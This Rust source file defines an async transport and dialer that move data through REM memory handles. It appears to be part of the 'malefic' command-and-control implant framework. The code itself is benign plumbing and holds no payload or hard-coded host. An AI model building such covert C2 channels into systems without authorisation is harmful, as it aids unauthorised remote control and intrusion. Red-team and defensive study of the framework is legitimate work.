use crate::transport::{DialerExt, Stream, TransportTrait};
use anyhow::Result;
use async_trait::async_trait;
use futures::channel::oneshot;
use malefic_helper::common::rem;
use malefic_helper::debug;
use std::io;
use std::thread;

pub struct REMTransport {
    handle: i32,
}

impl Clone for REMTransport {
    fn clone(&self) -> Self {
        REMTransport {
            handle: self.handle,
        }
    }
}

impl REMTransport {
    pub fn new(handle: i32) -> Self {
        REMTransport { handle }
    }

    fn spawn_blocking_task<F, T>(f: F) -> impl futures::Future<Output = io::Result<T>>
    where
        F: FnOnce() -> Result<T, String> + Send + 'static,
        T: Send + 'static,
    {
        let (sender, receiver) = oneshot::channel();

        thread::spawn(move || {
            let result = f().map_err(|e| io::Error::new(io::ErrorKind::Other, e));
            let _ = sender.send(result);
        });

        async move {
            receiver
                .await
                .map_err(|_| io::Error::new(io::ErrorKind::Other, "Blocking task channel closed"))?
        }
    }
}

#[async_trait]
impl TransportTrait for REMTransport {
    async fn done(&mut self) -> Result<()> {
        Ok(())
    }

    async fn recv(&mut self, len: usize) -> Result<Vec<u8>> {
        let mut buf = vec![0; len];
        let handle = self.handle;

        let (buf, n) =
            Self::spawn_blocking_task(move || rem::memory_read(handle, &mut buf).map(|n| (buf, n)))
                .await
                .map_err(|e| anyhow::anyhow!("{}", e))?;

        let mut result = buf;
        result.truncate(n);
        Ok(result)
    }

    async fn send(&mut self, data: Vec<u8>) -> Result<usize> {
        let handle = self.handle;

        Self::spawn_blocking_task(move || rem::memory_write(handle, &data))
            .await
            .map_err(|e| anyhow::anyhow!("{}", e))
    }

    async fn close(&mut self) -> Result<bool> {
        rem::memory_close(self.handle)
            .map_err(|e| anyhow::anyhow!("{}", e))
            .map(|_| true)
    }
}


#[derive(Clone)]
pub struct REMClient {
    pub stream: Stream,
}

#[async_trait]
impl DialerExt for REMClient {
    async fn connect(&mut self, addr: &str) -> Result<REMTransport> {
        debug!("[transport] Connecting to REM at {}", addr);

        let handle = rem::memory_dial("memory", addr).map_err(|e| anyhow::anyhow!("{}", e))?;

        debug!("[transport] REM memory handle: {}", handle);
        Ok(REMTransport::new(handle))
    }
}
